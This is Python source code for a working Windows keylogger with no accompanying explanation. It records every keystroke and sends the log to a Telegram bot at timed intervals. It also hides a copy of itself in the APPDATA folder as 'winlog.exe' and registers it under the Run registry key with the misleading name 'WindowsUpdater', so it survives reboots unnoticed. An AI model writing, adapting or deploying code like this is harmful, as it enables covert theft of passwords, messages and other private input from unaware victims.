from pynput import keyboard
import requests
import threading
import os
import shutil
import sys
import winreg
import ctypes
import dotenv

# Load configuration from .env file
dotenv.load_dotenv()

# Configuration - must be set in .env file
bot_token = os.getenv('TELEGRAM_BOT_TOKEN', 'Your_bot_token_here')
chat_id = os.getenv('TELEGRAM_CHAT_ID', 'Your_chat_id_here)')
interval = int(os.getenv('REPORT_INTERVAL', 30))  # Seconds between reports
filename = os.getenv('PERSISTENCE_FILENAME', "winlog.exe")
log = ""

def send_log(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=data)
    except:
        pass

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += f' [{key}] '

def report():
    global log
    if log:
        send_log(log)
        log = ""
    timer = threading.Timer(interval, report)
    timer.daemon = True
    timer.start()

def setup():
    hidden_path = os.path.join(os.getenv("APPDATA"), filename)
    if not os.path.exists(hidden_path):
        shutil.copy2(sys.executable, hidden_path)
        ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, hidden_path)
        winreg.CloseKey(key)
        os.startfile(hidden_path)
        sys.exit()

setup()
report()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
